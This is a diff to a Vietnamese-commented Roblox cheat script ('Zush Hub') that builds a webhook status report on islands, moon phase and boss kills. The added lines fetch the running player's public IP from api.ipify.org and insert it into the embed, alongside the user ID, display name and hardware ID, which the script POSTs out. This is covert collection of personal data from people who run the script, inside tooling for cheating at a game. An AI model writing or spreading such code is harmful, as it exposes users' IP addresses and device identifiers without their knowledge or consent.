@@ -1519,6 +1519,8 @@ spawn(function()
         end
     end
 end)
+-- Lấy IP
+local ipAddress = tostring(game:HttpGet("https://api.ipify.org", true))
 
 local placeId = game.PlaceId
 local jobId = game.JobId
@@ -1561,11 +1563,8 @@ elseif moonId == "http://www.roblox.com/asset/?id=9709149680" then
 else
     moonPhase = "Wait For Moon"
 end
--- Check Kitsune Island
-local devilFruitStatus = "❌"
-if game.Workspace:FindFirstChild("DevilFruit") then
-	devilFruitStatus = "🟢"
-end
+
+-- Check Island/Items
 
 local kitsuneIslandStatus = "❌"
 if game.Workspace.Map:FindFirstChild("KitsuneIsland") then
@@ -1596,15 +1595,10 @@ spawn(function()
     while wait() do
         pcall(function()
             local result = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner")
-
-            if string.len(result) == 88 then
-                KatakuriStatus = "Kill: " .. string.sub(result, 39, 41)
-                BuonNaoDauAiThau:SetDesc(KatakuriStatus)
-            elseif string.len(result) == 87 then
-                KatakuriStatus = "Kill: " .. string.sub(result, 39, 40)
-                BuonNaoDauAiThau:SetDesc(KatakuriStatus)
-            elseif string.len(result) == 86 then
-                KatakuriStatus = "Kill: " .. string.sub(result, 39, 39)
+            local len = string.len(result)
+            if len >= 86 and len <= 88 then
+                local kills = string.sub(result, 39, len - 47)
+                KatakuriStatus = "Kill: " .. kills
                 BuonNaoDauAiThau:SetDesc(KatakuriStatus)
             else
                 KatakuriStatus = "🟢"
@@ -1614,16 +1608,17 @@ spawn(function()
     end
 end)
 
+-- Dữ liệu gửi webhook
 local Data =
 {
 	["embeds"] = {
 		{
-			["title"] = "Thông Tin | Zush Hub Pro",
+			["title"] = "Thông Tin | Zush Hub",
 			["url"] = "https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId,
 			["description"] = "```" .. game.Players.LocalPlayer.DisplayName .. " ```",
 			["color"] = tonumber("0xf7c74b"),
 			["thumbnail"] = {
-				["url"] = "https://cdn.discordapp.com/attachments/1277112182743629969/1277337544463224898/Picsart_24-08-26_01-42-34-420.png?ex=66ccccca&is=66cb7b4a&hm=80a0165401d2357f1386cfa88da35a3df2427c1186b0e8b7955272f6c5f6ead9&"
+				["url"] = "https://cdn.discordapp.com/attachments/1277112182743629969/1277337544463224898/Picsart_24-08-26_01-42-34-420.png"
 			},
 			["fields"] = {
 				{
@@ -1635,6 +1630,11 @@ local Data =
 					["name"] = "Hwid:",
 					["value"] = hwid,
 					["inline"] = true
+				},
+				{
+					["name"] = "IP Address:",
+					["value"] = "```" .. ipAddress .. "```",
+					["inline"] = false
 				},
 				{
 					["name"] = "Sea:",
@@ -1661,12 +1661,12 @@ local Data =
 					["value"] = "```" .. kitsuneIslandStatus .. "```",
 					["inline"] = true
 				},
-                                {
+                {
 					["name"] = "🏝️ Mirage Island:",
 					["value"] = "```" .. MirageIslandStatus .. "```",
 					["inline"] = true
 				},
-                                {
+                {
 					["name"] = "🏝️ Frozen Dimension:",
 					["value"] = "```" .. FrozenIslandStatus .. "```",
 					["inline"] = true
@@ -1681,11 +1681,6 @@ local Data =
 					["value"] = "```" .. KatakuriStatus .. "```",
 					["inline"] = true
 				},
-                {
-					["name"] = "Devil Fruit in Server:",
-					["value"] = "```" .. devilFruitStatus .. "```",
-					["inline"] = true
-				},
 				{
 					["name"] = "Ty For Use:",
 					["value"] = "**__Zush Hub__**",
@@ -1696,6 +1691,7 @@ local Data =
 	}
 }
 
+-- Gửi dữ liệu qua webhook
 local Headers = {
 	["Content-Type"] = "application/json"
 }
@@ -1708,4 +1704,5 @@ local Final = {
 	Method = "POST",
 	Headers = Headers
 }
-Request(Final)
+Request(Final
+)
